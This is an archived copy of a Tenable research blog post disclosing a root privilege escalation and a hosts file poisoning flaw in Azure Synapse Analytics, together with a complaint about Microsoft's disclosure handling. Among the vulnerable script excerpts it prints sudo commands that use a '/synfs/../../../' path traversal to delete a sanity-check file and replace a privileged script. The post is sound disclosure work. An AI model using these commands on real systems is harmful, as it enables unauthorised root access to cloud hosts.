---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-06-13_microsoft-azure-synapse-pwnalytics.md
original_filename: 2022-06-13_microsoft-azure-synapse-pwnalytics.md
title: Microsoft Azure Synapse Pwnalytics
category: documents
detected_topics:
- cloud-security
- access-control
- command-injection
- path-traversal
- graphql
- api-security
tags:
- imported
- documents
- cloud-security
- access-control
- command-injection
- path-traversal
- graphql
- api-security
language: en
raw_sha256: a25be09b9bb0619d89633366a946f36bf0737f587965977f9e0b6c73bb46783d
text_sha256: 88d22f3ce8673c3a09586aaf44082e71322a6878fe87f00b5f32acfea2ccb63b
ingested_at: '2026-06-28T07:32:12Z'
sensitivity: unknown
redactions_applied: true
---

# Microsoft Azure Synapse Pwnalytics

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-06-13_microsoft-azure-synapse-pwnalytics.md
- Source Type: markdown
- Detected Topics: cloud-security, access-control, command-injection, path-traversal, graphql, api-security
- Ingested At: 2026-06-28T07:32:12Z
- Redactions Applied: True
- Raw SHA256: `a25be09b9bb0619d89633366a946f36bf0737f587965977f9e0b6c73bb46783d`
- Text SHA256: `88d22f3ce8673c3a09586aaf44082e71322a6878fe87f00b5f32acfea2ccb63b`


## Content

---
title: "Microsoft Azure Synapse Pwnalytics"
url: "https://medium.com/tenable-techblog/microsoft-azure-synapse-pwnalytics-87c99c036291"
authors: ["Jimi Sebree (@DinoBytes)"]
programs: ["Microsoft"]
bugs: ["Privilege escalation", "Cloud"]
publication_date: "2022-06-13"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2561
scraped_via: "browseros"
---

# Microsoft Azure Synapse Pwnalytics

Microsoft Azure Synapse Pwnalytics
James Sebree
Follow
11 min read
·
Jun 13, 2022

79

Synapse Analytics is a platform used for machine learning, data aggregation, and other such computational work. One of the primary developer-oriented features of this platform is the use of Jupyter notebooks. These are essentially blocks of code that can be run independently of one another in order to analyze different subsets of data.

Synapse Analytics is currently listed under Microsoft’s high-impact scenarios in the Azure Bug Bounty program. Microsoft states that products and scenarios listed under that heading have the highest potential impact to customer security.

Press enter or click to view image in full size

Synapse Analytics utilizes Apache Spark for the underlying provisioning of clusters that user code is run on. User code in these environments is run with intentionally limited privileges because the environments are managed by internal Microsoft subscription IDs, which is generally indicative of a multi-tenant environment.

Tenable Research has discovered a privilege escalation flaw that allows a user to escalate privileges to that of the root user within the context of a Spark VM. We have also discovered a flaw that allows a user to poison the hosts file on all nodes in their Spark pool, which allows one to redirect subsets of traffic and snoop on services users generally do not have access to. The full privilege escalation flaw has been adequately addressed. However, the hosts file poisoning flaw remains unpatched at the time of this writing.

Many of the keys, secrets, and services accessible via these attacks have traditionally allowed further lateral movement and potential compromise of Microsoft-owned infrastructure, which could lead to a compromise of other customers’ data as we’ve seen in several other cases recently, such as Wiz’s ChaosDB or Orca’s AutoWarp. For Synapse Analytics, however, access by a root user is limited to their own Spark pool. Access to resources outside of this pool would require additional vulnerabilities to be chained and exploited. While Tenable remains skeptical that cross-tenant access is not possible with the elevated level of access gained by exploitation of these flaws, the Synapse engineering team has assured us that such a feat is not possible.

Tenable has rated this issue as Critical severity based on the context of the Spark VM itself. Microsoft considers this issue a Low severity defense-in-depth improvement based on the context of the Synapse Analytics environment as a whole. Microsoft states that cross-tenant impact of this issue is unlikely, if not impossible, based on this vulnerability alone.

We’ll get to the technical bits soon, but let’s first address some disclosure woes. When it comes to Synapse Analytics, Microsoft Security Response Center (MSRC) and the development team behind Synapse seem to have a major communications disconnect. It took entirely too much effort to get any sort of meaningful response from our case agent. Despite numerous attempts at requesting status updates via emails and the researcher portal, it wasn’t until we reached out via Twitter that we would receive responses. During the disclosure process, Microsoft representatives initially seemed to agree that these were critical issues. A patch for the privilege escalation issue was developed and implemented without further information or clarification being required from Tenable Research. This patch was also made silently and no notification was provided to Tenable. We had to discover this information for ourselves.

During the final weeks of the disclosure process, MSRC began attempting to downplay this issue and classified it as a “best practice recommendation” rather than a security issue. Their team stated the following (typos are Microsoft’s): “[W]e do not consider this to be a important severity security issue but rather a better practice.” If that were the case, why can snippets like the following be found throughout the Spark VMs?

Press enter or click to view image in full size

It wasn’t until we notified MSRC of the intent to publish our findings that they acknowledged these issues as security-related. At the eleventh hour of the disclosure timeline, someone from MSRC was able to reach out and began rectifying the communication mishaps that had been occuring.

Unfortunately, communication errors and the downplaying of security issues in their products and cloud offerings is far from uncommon behavior for MSRC as of late. For a few more recent examples where MSRC has failed to adequately triage findings and has acted in bad faith towards researchers, check out the following research articles:

Positive Security — Windows 10 RCE
- MSRC initially dismissed this issue entirely. After appeals from Positive Security, MSRC agreed on the severity of the issue, but only awarded 10% of the bounty assessment.
- https://positive.security/blog/ms-officecmd-rce
Fortinet — MSDT Code Execution
- MSRC initially claimed that the recent “follina” 0day had no security impact.
- https://www.fortinet.com/blog/threat-research/analysis-of-follina-zero-day
NETSPI — Azure CloudShell Privilege Escalation
- Researchers discovered that users could download files and operate in the context of other users within the CloudShell environment. MSRC claimed this was by design.
- https://www.netspi.com/blog/technical/cloud-penetration-testing/attacking-azure-cloud-shell/
@j00sean — Another MSDT Code Execution issue
- https://twitter.com/j00sean/status/1534124426874261504
The Flaws
Privilege Escalation

The Jupyter notebook functionality of Synapse runs as a user called “trusted-service-user” within an Apache Spark cluster. These compute resources are provisioned to a specific Azure tenant, but are managed internally by Microsoft. This can be verified by viewing the subscription ID of the nodes on the cluster (only visible with elevated privileges and the Azure metadata service). This is indicative of a multi-tenant environment.

Press enter or click to view image in full size
Not our subscription ID

This “trusted-service-user” has limited access to many of the resources on the host and is intentionally unable to interact with “waagent,” the Azure metadata service, the Azure WireServer service, and many other services only intended to be accessed by the root user and other special accounts end-users do not normally have access to.

That said, the trusted-service-user does have sudo access to a utility that is used to mount file shares from other Azure services:

Press enter or click to view image in full size

The above screenshot shows that the Jupyter notebook code is running as the “trusted-service-user” account and that it has sudo access to run a particular script without requiring a password.

The filesharemount.sh script happens to contain a handful of flaws that, when combined, can be used to escalate privileges to root. The full text has been omitted from this section for brevity, but relevant bits are highlighted below.

#!/bin/bash
#
# NodeAgent installation script.
#
# Maintained by spark-service-dev@microsoft.com.
# Copyright © Microsoft Corporation. All rights reserved.
#
# this script use cifs to mount fileshare, will be deprecated once we implement fuse driver to mount fileshare
SCRIPT_DIR=”$( cd “$( dirname “${BASH_SOURCE[0]}” )” >/dev/null 2>&1 && pwd )”
source ${SCRIPT_DIR}/functions.sh
...

First and foremost, this script is clearly temporary and has likely not undergone strict review as indicated by the deprecation warning. Additionally, it appears that several functions are sourced from a “functions.sh” file in the same directory.

The functions provided by “functions.sh” are used for sanity checks throughout the main script. For example, the following is used to determine if a given mount point is valid before attempting to unmount it:

...
if [ “$commandtype” = “unmount” ]; then
  check_if_is_valid_mount_point_before_unmount $args
  umount $args
  rm -rf $args
  exit 0
fi
...

Moving on, the end of the main script is where we find the good stuff:

...
chown -R ${TRUSTED_SERVICE_USER}:${TRUSTED_SERVICE_USER} “$mountPoint”
uid=$(id -u ${TRUSTED_SERVICE_USER})
gid=$(id -g ${TRUSTED_SERVICE_USER})
mount -t cifs //”$account”.file.core.windows.net/”$fileshare” “$mountPoint” -o vers=3.0,uid=$uid,gid=$gid,username=”$account”,password=***REDACTED***
if [ “$?” -ne “0” ]; then
  check_if_deletable_folder “$mountPoint”
  rm -rf “$mountPoint”
  exit 1
fi

Another of the check functions from functions.sh is used above, but this time the check is keyed off successfully running the mount command a few lines earlier. If the mount command fails, the mount point is deleted. By providing a mount point that passes all sanity checks to this point and that has invalid file share credentials, we can trigger the “rm” command in the above snippet. Let’s use it to get rid of the functions.sh file, and thus, all of the sanity check functions.

Press enter or click to view image in full size

Full command used for file deletion:

sudo -u root /usr/lib/notebookutils/bin/filesharemount.sh mount mountPoint:/synfs/../../../usr/lib/notebookutils/bin/functions.sh source:https://testshare@gfieristorage.file.core.windows.net accountKey:invalid 2>&1

The functions.sh file only checks that the mountPoint begins with “/synfs” before determining that it is valid. This allows a simple directory traversal attack to bypass that function.

Get James Sebree’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Now we can bypass all checks from functions.sh, remove the existing filesharemount.sh utility, and mount our own in the same directory, which still has sudo access. We created a test share using the Gen2 Storage service within Azure. We created a file in this share called “filesharemount.sh” with the contents being “id”. This allows us to demonstrate the execution privileges now granted to us.

Our mount command looks like this:

sudo -u root /usr/lib/notebookutils/bin/filesharemount.sh mount mountPoint:/synfs/../../../usr/lib/notebookutils/bin/ source:https://testshare@gfieristorage.file.core.windows.net accountKey:REDACTED 2>&1

Let’s check our access now:

Press enter or click to view image in full size
Hosts File Poisoning

There exists a service on one of the hosts in each Spark pool called “HostResolver.” To be specific, it can be found at “/opt/microsoft/Microsoft.Analytics.Clusters.Services.HostResolver.dll” on each of the nodes in the Synapse environment. This service is used to manage the “hosts” file for all hosts in the Spark cluster. This supports ease-of-management — administrators can send commands to each host by a preset hostname, rather than keeping track of IP addresses, which can change based on the scaling features of the pool.

Due to the lack of any authentication features, a low-privileged user is able to overwrite the “hosts” file on all nodes in their Spark pool, which allows them to snoop on services and traffic they otherwise are not intended to be able to see. To be clear, this isn’t any sort of game-changing vulnerability or of any real significance on its own. We do believe, however, that this flaw warrants a patch due to its potential as a critical piece of a greater exploit chain. It’s also just kinda fun and interesting.

For example, here’s a view of the information used by each host:

Press enter or click to view image in full size

Output:

Press enter or click to view image in full size

The hostresolver can be queried like this:

Press enter or click to view image in full size

What happens when a new host is added to the pool? Well, a register request is sent to the hostresolver, which parses the request, and then sends out an update to all other hosts in the pool to update their hosts file. If the entry already exists, it is overwritten.

This register request looks like this:

Press enter or click to view image in full size

The updated hosts file looks like this:

Press enter or click to view image in full size

This change is propagated to all hosts in the pool. As there is no authentication to this service, we can arbitrarily modify the hosts file on all nodes by manually submitting register requests. If these hosts were provisioned under our subscription ID in Azure, this wouldn’t be an issue since we’d already have full control of them. Since we don’t actually own these hosts, however, this is a slightly bigger problem.

When we originally reported this issue, communicating to hosts outside of one’s own Spark pool was possible. We assume that was a separate issue as it was fixed during the course of our own research and not publicly disclosed by Microsoft. This new inability to communicate outside of our own pool severely limits the impact of this flaw by itself, now requiring other flaws in order to achieve greater impact. At the time of this writing, the hosts file poisoning flaw remains unpatched.

Key Takeaways

Patching in cloud environments is largely out of end-users’ control. Customers are entirely beholden to the cloud providers to fix reported issues. The good news is that once an issue is fixed, it’s fixed. Customers generally don’t have any actions to take since everything happens behind the scenes.

The bad news, however, is that the cloud providers rarely provide notice that a security-related flaw was ever present in the first place. Cloud vulnerabilities rarely receive CVEs because they aren’t static products. They are ever-changing beasts with no accountability requirements in terms of notifying users and customers of security-related changes.

It doesn’t matter how good any given vendor’s software supply chain is if there are parts of the process or product that don’t rely on it. For example, the filesharemount.sh script (and other scripts discovered on these hosts) have very clear deprecation warnings in them and don’t appear to be required to go through the normal QA channels. Chances are this was a temporary script to enable necessary functionality with the intention of replacing it sometime down the line, but that sometime never arrived and it became a fairly critical component, which is a situation any software engineer is all too familiar with.

Additionally, because these environments are so volatile, it makes it difficult for security researchers to accurately gauge the impact of their findings because of strict Rules of Engagement and changes happening over the course of one’s research.

For example, in the hosts file poisoning vulnerability discussed in this blog, we noticed that we were able to change the hosts files in pools outside of our own, but this was fixed at some point during the disclosure process by introducing more robust firewalling rules at the node-level. We also noticed many changes happening with certain features of the service throughout our research, which we now know was the doing of the good folks at Orca Security during their SynLapse research.

On a final note, while we respect the efforts of researchers that go the extra mile to compromise customer data and internal vendor secrets, we believe it’s in everyone’s best interest to adhere to the rules set forth by each of the cloud vendors. Since there are so many moving pieces in these environments and likely many configurations outsiders are not privy to, violating these rules of engagement could have unintended consequences we’d rather not be responsible for. This does, however, introduce a sort of Catch-22 for researchers where the vendor can claim that a disclosure report does not adequately demonstrate impact, but also claim that a researcher has violated the rules of engagement if they do take the extra steps to do so.

For more information regarding these issues and their disclosure timelines, please see the following Tenable Research Advisories:

https://www.tenable.com/security/research/tra-2022-19
https://www.tenable.com/security/research/tra-2022-20
